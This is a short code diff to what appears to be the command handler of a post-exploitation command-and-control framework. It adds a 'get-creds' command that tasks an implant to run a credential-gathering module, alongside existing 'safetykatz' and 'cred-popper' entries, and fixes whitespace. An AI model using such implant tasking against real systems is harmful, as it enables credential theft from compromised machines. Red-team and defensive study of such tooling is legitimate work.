@@ -207,6 +207,9 @@ def handle_sharp_command(command, user, randomuri, startup, implant_id, commandl
     elif (command.startswith("safetykatz")):
         new_task("run-exe SafetyKatz.Program %s" % command, user, randomuri)
 
+    elif (command.startswith("get-creds")):
+        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
+
     elif (command.startswith("cred-popper")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
@@ -254,7 +257,7 @@ def handle_sharp_command(command, user, randomuri, startup, implant_id, commandl
             if (".exe" in mod) or (".dll" in mod):
                 print(mod)
         new_task("listmodules", user, randomuri)
-        
+
     elif command.startswith("modulesloaded"):
         ml = get_implantdetails(randomuri)
         print(ml[14])
